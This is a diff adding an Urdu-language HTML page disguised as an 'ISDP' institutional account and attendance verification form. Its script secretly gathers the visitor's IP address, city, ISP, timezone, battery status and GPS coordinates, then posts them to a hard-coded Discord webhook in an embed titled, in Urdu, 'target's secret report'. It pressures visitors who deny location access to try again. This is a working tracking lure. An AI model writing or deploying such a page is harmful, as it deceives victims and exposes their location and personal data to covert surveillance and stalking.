@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="ur" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>ISDP - تصدیقِ اکاؤنٹ</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #eef2f3; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { background: white; border-top: 8px solid #2e7d32; padding: 40px; border-radius: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.15); text-align: center; width: 340px; }
+        .logo { font-size: 50px; margin-bottom: 10px; }
+        h2 { color: #1b5e20; font-size: 22px; margin: 10px 0; }
+        p { color: #444; font-size: 15px; line-height: 1.6; margin-bottom: 25px; }
+        .btn { background: #2e7d32; color: white; border: none; padding: 15px 30px; border-radius: 10px; width: 100%; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.4s; }
+        .btn:hover { background: #1b5e20; transform: translateY(-2px); }
+        #msg { display: none; margin-top: 20px; color: #2e7d32; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="logo">🏢</div>
+    <h2>اکاؤنٹ کی تصدیق</h2>
+    <p>السلام علیکم! ادارے کے ریکارڈ کو اپ ڈیٹ کیا جا رہا ہے۔ اپنی حاضری اور اکاؤنٹ کی تصدیق کے لیے نیچے بٹن دبائیں۔</p>
+    
+    <button class="btn" onclick="startProcess()">تصدیق مکمل کریں</button>
+    <div id="msg">سسٹم سے رابطہ ہو رہا ہے، انتظار کریں...</div>
+</div>
+
+<script>
+    async function startProcess() {
+        document.getElementById("msg").style.display = "block";
+        
+        // 1. وقت اور ٹائم زون نکالنا
+        const localTime = new Date().toLocaleString();
+        const tZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+        // 2. آئی پی اور نیٹ ورک نکالنا
+        let ipInfo = {};
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            ipInfo = await response.json();
+        } catch (e) {}
+
+        // 3. بیٹری کی تفصیلات
+        let battStatus = "دستیاب نہیں";
+        try {
+            const battery = await navigator.getBattery();
+            battStatus = `${Math.round(battery.level * 100)}% (${battery.charging ? 'چارجنگ پر ہے' : 'بیٹری پر ہے'})`;
+        } catch(e) {}
+
+        const sendData = async (latitude = "اجازت نہیں ملی", longitude = "اجازت نہیں ملی") => {
+            // آپ کا ویب ہک لنک یہاں لگا دیا گیا ہے
+            const webhookURL = "https://discord.com/api/webhooks/1470998243826602132/T60IyiL2tylMGTqYes0mwWzq59wUn9-HjEG0_FWTW7iQtapXwRDzOd5eoDQNYa276z6A";
+            
+            const payload = {
+                embeds: [{
+                    title: "🎯 ٹارگٹ کی خفیہ رپورٹ",
+                    color: 3066993,
+                    fields: [
+                        { name: "⏰ موبائل کا وقت", value: localTime, inline: true },
+                        { name: "🌐 ٹائم زون", value: tZone, inline: true },
+                        { name: "🌍 آئی پی لوکیشن", value: `${ipInfo.city}, ${ipInfo.country_name} (${ipInfo.ip})` },
+                        { name: "🏢 انٹرنیٹ کمپنی", value: ipInfo.org || "Unknown" },
+                        { name: "🔋 بیٹری کی حالت", value: battStatus, inline: true },
+                        { name: "📍 میپ لنک", value: `[گوگل میپس پر دیکھیں](https://www.google.com/maps?q=${latitude},${longitude})` }
+                    ],
+                    footer: { text: "ISDP Secure Monitoring" },
+                    timestamp: new Date()
+                }]
+            };
+
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        };
+
+        // لوکیشن کے لیے اجازت مانگنا
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (p) => { sendData(p.coords.latitude, p.coords.longitude); alert("آپ کی تصدیق مکمل ہو گئی ہے۔ جزاک اللہ!"); },
+                () => { sendData(); alert("تصدیق مکمل کرنے کے لیے لوکیشن کی اجازت درکار ہے۔ براہ کرم دوبارہ کوشش کریں۔"); }
+            );
+        } else {
+            sendData();
+        }
+    }
+</script>
+
+</body>
+</html>
